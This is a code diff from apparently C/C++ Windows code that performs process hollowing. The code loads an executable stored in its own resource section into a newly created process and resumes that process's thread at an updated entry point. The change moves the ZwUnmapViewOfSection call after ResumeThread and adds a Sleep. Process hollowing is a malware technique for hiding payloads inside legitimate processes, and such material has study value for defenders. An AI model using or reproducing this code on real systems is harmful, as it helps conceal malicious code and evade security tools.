@@ -40,9 +40,6 @@ int main()
 	PPEB pPeb = new PEB();
 	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, pPeb, sizeof(PEB), 0);
 
-	/* Unmap the virtual memory allocated to the created processes image */
-	ZwUnmapViewOfSection(pi.hProcess, pPeb->ImageBaseAddress);
-
 	/* Find and load exe stored in the PE's resource section */
 	HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
 	HGLOBAL resourceData = LoadResource(NULL, resource);
@@ -110,10 +107,14 @@ int main()
 	/* Resume the created processes main thread with the updated OEP */
 	ResumeThread(pi.hThread);
 
+	Sleep(100);
+	/* Unmap the virtual memory allocated to the created processes image */
+	ZwUnmapViewOfSection(pi.hProcess, pPeb->ImageBaseAddress);
 
 	printf("\nCreated Process id: %i\n", pi.dwProcessId);
 	printf("Created process Image Base Address 0x%x\n", pPeb->ImageBaseAddress);
 	printf("Injected process Image Base Address 0x%x\n", baseAddressInjectedPE);
+
 
 	return 0;
 }
